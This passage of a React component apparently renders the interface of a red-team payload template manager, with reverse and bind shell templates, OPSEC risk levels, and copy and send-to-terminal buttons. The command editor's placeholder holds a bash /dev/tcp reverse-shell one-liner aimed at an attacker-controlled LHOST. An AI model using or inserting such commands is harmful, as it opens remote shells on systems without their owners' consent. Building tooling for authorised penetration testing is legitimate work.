                        gap: '0.4rem',
                        color: '#f59e0b',
                      }}
                    >
                      <CyberIcon name="shield" size={14} />
                      <span>OPSEC RISK NOTICE // SIGNATURE &amp; EGRESS RESTRICTIONS</span>
                    </div>
                    <ul style={{ margin: 0, paddingLeft: '1.25rem' }}>
                      {renderResult.opsecWarnings.map((w, idx) => (
                        <li key={idx} style={{ marginTop: '0.18rem' }}>
                          {w}
                        </li>
                      ))}
                    </ul>
                  </div>
                )}

                {/* Template Notes / Requirements */}
                {currentTemplate.notes && (
                  <div
                    style={{
                      padding: '0.5rem 0.8rem',
                      backgroundColor: 'rgba(2, 8, 18, 0.75)',
                      border: '1px solid rgba(0, 240, 255, 0.2)',
                      fontSize: '0.74rem',
                      color: '#cbd5e1',
                    }}
                  >
                    <span style={{ color: '#00f0ff', fontWeight: 700 }}>Operational Notes: </span>
                    {currentTemplate.notes}
                  </div>
                )}

                {/* Main Command Output or Empty Prompt */}
                <div style={{ flex: 1, display: 'flex', flexDirection: 'column', minHeight: 0, gap: '0.45rem' }}>
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                    <span
                      style={{
                        fontSize: '0.72rem',
                        fontWeight: 800,
                        color: '#00f0ff',
                        letterSpacing: '0.08em',
                      }}
                    >
                      /// RENDERED PAYLOAD // READY FOR EXECUTION ///
                    </span>
                    {rendering && <span style={{ fontSize: '0.7rem', color: '#94a3b8' }}>Rendering...</span>}
                  </div>

                  {!currentTemplate.command || currentTemplate.command.trim() === '' ? (
                    <div
                      className="card-code-terminal"
                      style={{
                        flex: 1,
                        display: 'flex',
                        flexDirection: 'column',
                        alignItems: 'center',
                        justifyContent: 'center',
                        border: '1px dashed rgba(245, 158, 11, 0.45)',
                        padding: '2rem 1.5rem',
                        textAlign: 'center',
                        cursor: 'default',
                      }}
                    >
                      <div style={{ color: '#f59e0b', marginBottom: '0.5rem' }}>
                        <CyberIcon name="terminal" size={28} />
                      </div>
                      <div style={{ fontSize: '0.9rem', fontWeight: 800, color: '#fef08a' }}>
                        Template Command Ready for Population
                      </div>
                      <div
                        style={{
                          fontSize: '0.75rem',
                          color: '#94a3b8',
                          maxWidth: '520px',
                          marginTop: '0.5rem',
                          lineHeight: '1.45',
                        }}
                      >
                        This template is registered in the external file (
                        <code>
                          {fileConfig?.filePath ? fileConfig.filePath.split(/[\\/]/).pop() : 'payload_templates.json'}
                        </code>
                        ) without hardcoded commands. Click below to populate the operational command using{' '}
                        <code style={{ color: '#00f0ff' }}>&#123;&#123;LHOST&#125;&#125;</code> and{' '}
                        <code style={{ color: '#00f0ff' }}>&#123;&#123;LPORT&#125;&#125;</code> placeholders.
                      </div>
                      <button
                        type="button"
                        className="cyber-btn cyber-btn-primary"
                        onClick={() => setEditingTemplate({ ...currentTemplate })}
                        style={{ marginTop: '1rem' }}
                      >
                        <CyberIcon name="edit" size={13} />
                        <span>Populate Template Command</span>
                      </button>
                    </div>
                  ) : (
                    <div
                      className="card-code-terminal"
                      style={{
                        flex: 1,
                        display: 'flex',
                        flexDirection: 'column',
                        justifyContent: 'space-between',
                        overflowY: 'auto',
                        cursor: 'default',
                      }}
                    >
                      <pre
                        style={{
                          margin: 0,
                          fontSize: '0.86rem',
                          lineHeight: '1.55',
                          color: '#00f0ff',
                          textShadow: '0 0 10px rgba(0, 240, 255, 0.25)',
                          whiteSpace: 'pre-wrap',
                          wordBreak: 'break-all',
                          fontFamily: 'var(--font-mono)',
                        }}
                      >
                        {renderResult ? renderResult.rendered : currentTemplate.command}
                      </pre>

                      {/* 10-Segment Tactical Bar */}
                      <div className="cyber-segment-bar" aria-hidden="true" style={{ marginTop: '0.75rem' }}>
                        {Array.from({ length: 10 }).map((_, idx) => (
                          <span
                            key={idx}
                            className={`seg-cell ${idx < (isStealthPort ? 10 : 7) ? 'seg-active' : 'seg-inactive'} ${isHighRiskPort ? 'seg-urgent' : !isStealthPort ? 'seg-warning' : ''
                              }`}
                          />
                        ))}
                      </div>
                    </div>
                  )}
                </div>

                {/* Bottom Action Buttons */}
                {currentTemplate.command && currentTemplate.command.trim() !== '' && (
                  <div className="card-action-row" style={{ gap: '0.55rem', flexWrap: 'wrap' }}>
                    <button
                      type="button"
                      className={`cyber-btn-copy ${copyFeedback ? 'is-copied' : ''}`}
                      style={{ display: 'inline-flex', alignItems: 'center', justifyContent: 'center', gap: '0.4rem', minHeight: '34px', whiteSpace: 'nowrap' }}
                      onClick={() => void handleCopy()}
                    >
                      <CyberIcon name="copy" size={13} />
                      <span>
                        {copyFeedback ? 'Copied to Clipboard!' : 'Copy Payload'}
                      </span>
                    </button>

                    <button
                      type="button"
                      className="cyber-btn cyber-btn-secondary"
                      style={{ minHeight: '34px', padding: '0.42rem 0.9rem', whiteSpace: 'nowrap' }}
                      onClick={() => void handleSaveSnippet()}
                      disabled={savingSnippet}
                    >
                      <CyberIcon name="save" size={13} />
                      <span>
                        {savingSnippet ? 'Saving...' : 'Save as Snippet'}
                      </span>
                    </button>

                    {activeSessionId && onSendToTerminal && (
                      <button
                        type="button"
                        className="cyber-btn-inject"
                        style={{ display: 'inline-flex', alignItems: 'center', justifyContent: 'center', gap: '0.4rem', minHeight: '34px', padding: '0.42rem 0.9rem', whiteSpace: 'nowrap' }}
                        onClick={handleSendTerminal}
                      >
                        <CyberIcon name="terminal" size={13} />
                        <span>Send to Terminal</span>
                      </button>
                    )}
                  </div>
                )}
              </div>
            ) : (
              <div className="cyber-empty-state">
                <div className="cyber-empty-radar" />
                <h3 className="cyber-empty-title">Select a payload template from the left panel.</h3>
              </div>
            )}
          </div>
        </div>

        {/* Footer Info Strip */}
        <div className="cyber-totp-footer">
          <span className="footer-hazard">///</span>
          <span className="footer-text">
            EXTERNAL JSON PAYLOAD MATRIX · NO HARDCODED SHELLS IN BINARY · DYNAMIC VARIABLE &amp; ENCODING PIPELINE
          </span>
          <button type="button" className="cyber-btn-sm cyber-btn-secondary" onClick={onClose}>
            CLOSE
          </button>
        </div>

        {/* Template Edit / Creation Modal */}
        {editingTemplate && (
          <div className="cyber-modal-overlay" onClick={() => setEditingTemplate(null)}>
            <div
              className="cyber-dialog-card"
              style={{ maxWidth: '680px', maxHeight: '90vh' }}
              onClick={(e) => e.stopPropagation()}
            >
              <div className="cyber-corner-reticle cyber-corner-tl" />
              <div className="cyber-corner-reticle cyber-corner-tr" />
              <div className="cyber-corner-reticle cyber-corner-bl" />
              <div className="cyber-corner-reticle cyber-corner-br" />
              <div className="cyber-dialog-header">
                <h3>
                  {editingTemplate.id.startsWith('tmpl-') && templates.some((t) => t.id === editingTemplate.id)
                    ? 'EDIT PAYLOAD TEMPLATE'
                    : 'NEW PAYLOAD TEMPLATE'}
                </h3>
                <button
                  type="button"
                  className="cyber-btn-close"
                  onClick={() => setEditingTemplate(null)}
                  aria-label="Close Payload Template Dialog"
                >
                  <CyberIcon name="close" size={13} />
                </button>
              </div>

              <div className="cyber-manual-form">
                <div className="cyber-form-grid-2">
                  <div className="cyber-field-group">
                    <label className="cyber-label">
                      Template Name <span className="req">*</span>
                      <input
                        type="text"
                        className="cyber-input"
                        value={editingTemplate.name}
                        onChange={(e) => setEditingTemplate({ ...editingTemplate, name: e.target.value })}
                        placeholder="e.g. Bash - Dev TCP Reverse"
                      />
                    </label>
                  </div>
                  <div className="cyber-field-group">
                    <label className="cyber-label">
                      Target OS
                      <select
                        className="cyber-select"
                        value={editingTemplate.os}
                        onChange={(e) => setEditingTemplate({ ...editingTemplate, os: e.target.value as PayloadOS })}
                      >
                        <option value="linux">Linux</option>
                        <option value="windows">Windows</option>
                        <option value="macos">macOS</option>
                        <option value="any">Any OS</option>
                      </select>
                    </label>
                  </div>
                </div>

                <div className="cyber-form-grid-3">
                  <div className="cyber-field-group">
                    <label className="cyber-label">
                      Shell / Interpreter
                      <input
                        type="text"
                        className="cyber-input"
                        value={editingTemplate.shell}
                        onChange={(e) => setEditingTemplate({ ...editingTemplate, shell: e.target.value })}
                        placeholder="e.g. bash, powershell"
                      />
                    </label>
                  </div>
                  <div className="cyber-field-group">
                    <label className="cyber-label">
                      Kind
                      <select
                        className="cyber-select"
                        value={editingTemplate.kind}
                        onChange={(e) => setEditingTemplate({ ...editingTemplate, kind: e.target.value })}
                      >
                        <option value="reverse">Reverse Shell</option>
                        <option value="bind">Bind Shell</option>
                        <option value="one-liner">One-Liner</option>
                        <option value="msfvenom">Msfvenom</option>
                      </select>
                    </label>
                  </div>
                  <div className="cyber-field-group">
                    <label className="cyber-label">
                      Default Port
                      <input
                        type="number"
                        className="cyber-input"
                        value={editingTemplate.defaultPort || 443}
                        onChange={(e) =>
                          setEditingTemplate({ ...editingTemplate, defaultPort: parseInt(e.target.value, 10) || 443 })
                        }
                      />
                    </label>
                  </div>
                </div>

                <div className="cyber-form-grid-2">
                  <div className="cyber-field-group">
                    <label className="cyber-label">
                      OPSEC Risk Level
                      <select
                        className="cyber-select"
                        value={editingTemplate.opsecRisk || 'low'}
                        onChange={(e) => setEditingTemplate({ ...editingTemplate, opsecRisk: e.target.value })}
                      >
                        <option value="low">Low Risk</option>
                        <option value="medium">Medium Risk</option>
                        <option value="high">High Risk (Detection Likely)</option>
                      </select>
                    </label>
                  </div>
                  <div className="cyber-field-group">
                    <label className="cyber-label">
                      Description
                      <input
                        type="text"
                        className="cyber-input"
                        value={editingTemplate.description || ''}
                        onChange={(e) => setEditingTemplate({ ...editingTemplate, description: e.target.value })}
                        placeholder="Brief description of this payload"
                      />
                    </label>
                  </div>
                </div>

                <div className="cyber-field-group">
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '0.4rem' }}>
                    <label className="cyber-label" htmlFor="payload-editor-command">
                      Payload Command Template * (Use &#123;&#123;LHOST&#125;&#125; and &#123;&#123;LPORT&#125;&#125;)
                    </label>
                    <span style={{ fontSize: '0.68rem', color: '#00f0ff' }}>Saved to external JSON file</span>
                  </div>
                  <div
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      flexWrap: 'wrap',
                      gap: '0.35rem',
                      padding: '0.45rem 0.65rem',
                      marginBottom: '0.4rem',
                      backgroundColor: 'rgba(6, 14, 26, 0.88)',
                      border: '1px solid rgba(0, 240, 255, 0.2)',
                      borderRadius: '4px',
                    }}
                  >
                    <span style={{ fontSize: '0.72rem', color: '#94a3b8', fontWeight: 600, marginRight: '0.2rem' }}>
                      Insert Variable:
                    </span>
                    {[
                      { token: '{{LHOST}}', hint: 'Insert local attacker / VPN callback IP placeholder' },
                      { token: '{{LPORT}}', hint: 'Insert listener port placeholder' },
                      { token: '{{SHELL=/bin/bash}}', hint: 'Insert interactive shell parameter with default' },
                      { token: '{{PARAM=default}}', hint: 'Insert custom variable placeholder' },
                    ].map((v) => (
                      <button
                        key={v.token}
                        type="button"
                        className="btn-var-pill"
                        title={v.hint}
                        onMouseDown={(e) => e.preventDefault()}
                        onClick={() => handleInsertTemplateVar(v.token)}
                      >
                        {v.token}
                      </button>
                    ))}
                  </div>
                  <textarea
                    id="payload-editor-command"
                    ref={commandTextareaRef}
                    className="cyber-textarea"
                    rows={5}
                    value={editingTemplate.command}
                    onChange={(e) => setEditingTemplate({ ...editingTemplate, command: e.target.value })}
                    placeholder="e.g. bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"
                  />
                </div>

                <div className="cyber-field-group">
                  <label className="cyber-label">
                    Operational Notes &amp; Pre-requisites
                    <input
                      type="text"
                      className="cyber-input"
                      value={editingTemplate.notes || ''}
                      onChange={(e) => setEditingTemplate({ ...editingTemplate, notes: e.target.value })}
                      placeholder="e.g. Requires python3 installed on target"
                    />
                  </label>
                </div>

                <div className="cyber-dialog-actions">
                  <button
                    type="button"
                    className="cyber-btn cyber-btn-danger"
                    onClick={() => setEditingTemplate(null)}
                  >
                    Cancel
                  </button>
                  <button
                    type="button"
                    className="cyber-btn cyber-btn-primary"
                    onClick={() => void handleSaveTemplateForm()}
                    disabled={savingTemplate}
                  >
                    {savingTemplate ? 'Saving...' : 'Save to External File'}
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
